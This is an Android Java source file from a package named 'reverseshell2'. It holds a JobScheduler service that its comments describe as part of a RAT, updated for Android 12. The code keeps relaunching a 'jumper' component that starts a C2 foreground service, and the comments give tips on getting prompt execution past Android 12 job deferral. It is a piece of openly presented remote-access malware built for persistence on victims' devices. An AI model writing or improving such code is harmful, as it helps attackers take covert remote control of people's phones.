package com.example.reverseshell2;

import android.app.job.JobParameters;
import android.app.job.JobService;
import android.os.Build;
import android.util.Log;

import androidx.annotation.RequiresApi;

/**
 * JobScheduler service, updated for Android 12.
 *
 * Android 12 notes:
 *  1. JobScheduler still works on Android 12, but jobs are deferred more
 *     aggressively depending on the app's App Standby Bucket. Do not rely on
 *     the 15-minute period being exact - it is a MINIMUM, and Android 12 may
 *     delay the job by hours if the app is in a restricted bucket.
 *
 *  2. Android 12 introduced EXPEDITED JOBS (setExpedited(true)) for
 *     time-sensitive tasks. If the RAT needs prompt execution, prefer
 *     expedited jobs for one-off wakeups instead of periodic jobs.
 *
 *  3. Starting a FOREGROUND SERVICE from a running JobService IS allowed on
 *     Android 12 (JobScheduler is exempt from the background-start
 *     restriction), so the jumper.init() path can safely start the C2
 *     foreground service.
 *
 *  4. Fixed: jobCancelled flag is now actually checked before jobFinished() so
 *     the system can reschedule correctly.
 *
 *  5. Fixed: jumper.init() is wrapped in try/catch so jobFinished() is ALWAYS
 *     called - otherwise the system treats the job as still running.
 *
 *  Manifest requirement:
 *      <service
 *          android:name=".jobScheduler"
 *          android:permission="android.permission.BIND_JOB_SERVICE"
 *          android:exported="false" />
 */
@RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
public class jobScheduler extends JobService {

    private static final String TAG = "jobSchedulerTest";
    private boolean jobCancelled = false;

    @Override
    public boolean onStartJob(JobParameters jobParameters) {
        Log.d(TAG, "Job started");
        doBackgroundWork(jobParameters);
        return true; // work continues on a background thread
    }

    @Override
    public boolean onStopJob(JobParameters jobParameters) {
        Log.d(TAG, "Job cancelled before completion");
        jobCancelled = true;
        // Returning true requests a retry of the job with the original backoff.
        return true;
    }

    private void doBackgroundWork(final JobParameters params) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    if (!jobCancelled) {
                        new jumper(getApplicationContext()).init();
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Background work failed", e);
                } finally {
                    // ALWAYS call jobFinished so the job is not left hanging.
                    Log.d(TAG, "Job finished");
                    jobFinished(params, jobCancelled);
                }
            }
        }).start();
    }
}

